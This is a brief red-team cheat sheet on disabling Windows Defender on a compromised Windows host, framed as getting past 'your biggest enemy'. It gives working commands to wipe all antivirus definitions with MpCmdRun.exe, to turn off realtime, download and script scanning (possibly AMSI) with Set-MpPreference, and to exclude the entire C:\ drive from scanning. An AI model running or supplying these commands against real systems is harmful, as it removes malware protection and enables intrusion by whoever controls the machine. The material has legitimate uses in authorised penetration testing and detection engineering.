
>[!info]
>Requires elevated privileges to run.

### Overview
---
On networks without third party AV solutions, Windows Defender will be your biggest enemy; the level of difficulty will vary based upon how up-to-date the definitions are.

### Rollback Definitions with MpCmdRun.exe
---

```powershell
# CMD
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All

# PowerShell
. "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

### Disabling Features with PowerShell
---

```powershell
# Disable scanning of all downloaded files and attachments
Set-MpPreference -DisableIOAVProtection $TRUE 

# Disable Realtime Monitoring
Set-MpPreference -DisableRealtimeMonitoring $TRUE

# Disable Script Scanning (potentially AMSI)
Set-MpPreference -DisableScriptScanning $TRUE

# Add path to be ignored by Windows Defender
Add-MpPreference -ExclusionPath "C:\"
```
